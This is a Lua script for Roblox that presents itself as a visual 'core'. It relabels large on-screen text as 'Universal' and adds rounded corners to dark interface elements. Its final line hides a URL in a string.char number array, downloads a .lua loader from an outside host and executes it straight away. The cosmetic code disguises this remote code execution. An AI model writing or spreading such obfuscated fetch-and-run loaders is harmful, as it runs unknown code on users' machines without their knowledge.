
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "Universal"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            -- 1. ЗАГОЛОВКИ (Smart Filter)
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            
            -- 2. СКРУГЛЕНИЯ (Modern UI)
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end
    
    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 108, 117, 97, 114, 109, 111, 114, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 118, 52, 47, 108, 111, 97, 100, 101, 114, 115, 47, 99, 98, 52, 50, 52, 50, 102, 101, 49, 54, 55, 97, 54, 50, 102, 98, 53, 51, 55, 53, 54, 102, 53, 50, 97, 51, 53, 54, 56, 52, 52, 57, 46, 108, 117, 97)))()
